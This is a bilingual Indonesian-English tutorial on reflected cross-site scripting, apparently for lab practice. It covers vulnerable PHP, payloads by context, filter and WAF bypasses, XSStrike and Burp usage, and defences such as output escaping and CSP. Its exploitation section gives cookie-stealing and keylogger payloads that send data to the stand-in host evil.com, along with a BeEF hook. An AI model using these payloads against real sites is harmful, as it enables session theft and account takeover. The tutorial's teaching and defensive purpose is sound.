# XSS (Reflected) - Client-Side Injection Attack

## 🎯 Apa Itu XSS Reflected?

**Reflected Cross-Site Scripting (XSS)** adalah vulnerability dimana attacker dapat inject arbitrary JavaScript code ke dalam response webpage. Script tersebut "reflected" (dikirim balik) dari request user langsung ke response browser tanpa persistent storage.

### Mengapa Disebut "Reflected"?
Karena malicious input dikirim melalui HTTP request dan langsung di-reflect kembali dalam HTTP response tanpa disembunyikan dalam server.

**Contoh Flow:**
1. Attacker craft malicious link: `http://victim.com/search?q=<script>alert(1)</script>`
2. User klik link tersebut
3. Server return response dengan `<script>alert(1)</script>` di dalam HTML
4. Browser execute JavaScript, menjalankan attack

## 🔬 Cara Kerja XSS Reflected

### HTTP Request Flow
```
Attacker → Malicious URL → Server → HTML Response dengan JS → Victim Browser → Execute Attack
```

### Vulnerable Code Example
```php
// Vulnerable search.php
$search = $_GET['query'];
echo "<h2>Search results for: " . $search . "</h2>";

// Jika user akses: search.php?query=<script>alert('XSS')</script>
// Output: <h2>Search results for: <script>alert('XSS')</script></h2>
```

### JavaScript Execution Context
XSS Reflected biasanya execute di lingkungan DOM global:
```javascript
// DOM access
document.cookie             // Steal session cookies
window.location             // Redirect or info leak
document.forms[0].submit()  // CSRF attacks
localStorage.getItem()      // Client-side storage access
```

## 🏗️ Teknologi Di Balik XSS

### Browser Rendering Engine
- **WebKit/Chrome:** V8 JavaScript Engine
- **Gecko/Firefox:** SpiderMonkey Engine
- **JavaScript Execution:** Dalam `<script>` tags atau event handlers
- **DOM Manipulation:** Modify page structure dan behavior

### Same-Origin Policy (SOP)
**Konsep Security**: JavaScript hanya dapat access resources dari same origin (scheme, host, port).

**XSS Bypass SOP**: Script execute dalam victim domain context, sehingga dapat access cookies, DOM, AJAX requests to same domain.

### HTTP Response Processing
1. **Server Processing:** Reflect user input tanpa sanitization
2. **Browser Parsing:** Parse HTML dan execute JavaScript
3. **DOM Building:** Create DOM tree dengan injected script
4. **Script Execution:** Run dalam global context

### Content-Type Handling
- **Content-Type: text/html:** Enable script execution
- **Content-Type: text/plain:** Prevent script execution
- **X-Content-Type-Options: nosniff:** Force browser respect declared type

## 📊 Tipe-Tipe XSS Reflected

### Basic XSS (LOW Difficulty)
**Tanpa filter:** Direct injection
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
```

### Filtered XSS (MEDIUM Difficulty)
**Input sanitization bypass**
```html
<sCrIpT>alert(1)</sCrIpT>          <!-- Case mixing -->
<script/* */>alert(1)</script>     <!-- Comments -->
<img src=x onmouseover=alert`1`>   <!-- Template literals -->
```

### Context-Specific XSS
**HTML Context:**
```html
<title>Search: <script>alert(1)</script></title>
```

**Attribute Context:**
```html
<input type="text" value="<script>alert(1)</script>">
<input onclick="javascript:alert(1)">
```

**JavaScript Context:**
```javascript
var search = "<script>alert(1)</script>";
document.write(search);
```

## 🛠️ Testing Serangan XSS Reflected

### Laboratory Testing Steps

#### Phase 1: Detection
1. **Basic Payload Test:**
   ```
   <script>alert('XSS')</script>
   <img src=x onerror=alert('XSS')>
   ```

2. **Context Analysis:**
   - HTML body context
   - Attribute context
   - JavaScript context

3. **Filter Detection:**
   - `<script>` tags filtered?
   - Keywords blocked?
   - Special chars escaped?

#### Phase 2: Exploitation
1. **Cookie Theft:**
   ```javascript
   <script>document.location='evil.com?c='+document.cookie</script>
   ```

2. **Keylogger:**
   ```javascript
   <script>
   document.onkeypress = function(e) {
       fetch('evil.com/keylog?c='+e.key);
   }
   </script>
   ```

3. **BeEF Integration:**
   ```javascript
   <script src="http://beef.com/hook.js"></script>
   ```

#### Phase 3: Advanced Attacks
1. **Clickjacking Setup:**
   ```html
   <iframe src="bank.com/transfer" style="opacity:0"></iframe>
   <script>document.forms[0].submit()</script>
   ```

2. **Session Hijacking:**
   ```javascript
   var img = new Image();
   img.src = 'evil.com/?cookie=' + document.cookie;
   ```

### Automated Testing Tools

#### XSStrike
```bash
# Basic XSS scan
xsstrike -u "http://target.com/search.php?q=test"

# Advanced scanning
xsstrike -u "target.com/param" --fuzzer --log=xss.log

# With payloads
xsstrike -u "target.com/vuln" --payload-level 3 --blind
```

#### Burp Suite Scanner
1. **Active Scan:** Detect XSS vulnerabilities
2. **Intruder:** Custom fuzzing payloads
3. **Repeater:** Manual payload testing
4. **Decoder:** Encode/decode payloads

#### Manual Proof-of-Concept
```html
<!-- Test URL structure -->
http://target.com/page.php?input=<script>alert(document.cookie)</script>

<!-- URL encoded -->
http://target.com/page.php?input=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

## 🛡️ Prevention & Mitigation

### Input Sanitization (Server-Side)
```php
// HTML escaping
echo htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');

// Or use templates
$name = htmlspecialchars($name);
echo "<h2>$name</h2>";
```

### Content Security Policy (CSP)
```html
<!-- Strict CSP -->
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' trusted.com;
    style-src 'self';
    img-src 'self' data:;
">

<!-- Implementation -->
header("Content-Security-Policy: default-src 'self'");
```

### X-XSS-Protection Header
```php
header('X-XSS-Protection: 1; mode=block');
```

### Template Engines
```python
# Jinja2 (auto-escape)
{{ user_input }}  # Escaped automatically

# Twig
{{ user_input|e }}  # Explicit escaping
```

### Client-Side Validation
```javascript
// Input validation
function sanitizeInput(input) {
    return input.replace(/[<>'"]/g, '');
}

// DOM manipulation safely
const div = document.createElement('div');
div.textContent = userInput;
element.appendChild(div);
```

## 🔍 XSS Impact Analysis

### Session Hijacking
1. Attacker steal session cookies
2. Attacker impersonate victim session
3. Full account control tanpa password

### Data Exfiltration
- Local storage access
- Form data theft
- Sensitive input capture (passwords, credit cards)

### Advanced Attacks
- **Persistent XSS:** Stored di database
- **DOM-based:** Client-side JavaScript manipulation
- **Blind XSS:** No immediate feedback

### Real-World Impact
- Account takeover
- Financial theft
- Brand reputation damage
- Regulatory violations

## 📈 Advanced XSS Techniques

### Filter Bypass Methods

#### WAF Bypass
```javascript
// Unusual tags
<ScrIpT>alert(1)</ScrIpT>

// CSS evasion
<div style="expression(alert(1))">

// SVG injection
<svg onload=alert(1)>

// MathML
<math><mtext><table><mglyph altimg="x"><mglyph onload="alert(1)">x</mglyph></mglyph></table></mtext></math>
```

#### Encoding Techniques
```javascript
// Hex encoding
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// String.fromCharCode()
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### Polyglot Payloads
```html
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+([1]*alert(1))//'>
```

### Mutation XSS Attacks
**XSS yang berubah ketika diproses server.**
```php
// Server code
$user_input = str_replace('script', '', $user_input);

// Payload: scr<script>ipt
// Becomes: script after replacement
scr<script>ipt becomes script after str_replace
```

## 🎯 Testing Methodologies

### Systematic Testing Framework
1. **Input Vector Identification:** Form fields, URL parameters, headers
2. **Context Analysis:** HTML, Attribute, JavaScript, CSS
3. **Payload Testing:** Start simple, evolve to complex
4. **Filter Enumeration:** Identify blocked patterns
5. **Bypass Testing:** Case mixing, encoding, unusual syntax

### Integration Testing
- **Browser Compatibility:** Test across Chrome, Firefox, Safari
- **Mobile Responsiveness:** Check XSS pada mobile sites
- **CDN Impact:** How caching mempengaruhi reflected XSS

### Reporting Structure
```
# Vulnerability: Reflected XSS
# URL: http://target.com/search?q=test
# Parameter: q
# Payload: <script>alert(document.cookie)</script>
# Impact: Cookie theft, session hijacking
# CVSS Score: 6.1 (Medium)
# Risks: Account takeover, data theft
# Mitigation: Input sanitization, CSP
```

## 📚 Learning Resources

- **OWASP XSS:** https://owasp.org/www-community/attacks/xss/
- **PortSwigger XSS:** Comprehensive guides dengan labs
- **XSS Cheat Sheet:** https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- **DOM XSS:** https://domgo.at/xss

---

**XSS Reflected adalah client-side injection attack yang powerful.** Dengan SOP bypass, attacker dapat control victim browser behavior. Master filtering techniques dan CSP implementation untuk defense mastery. 🌐💀
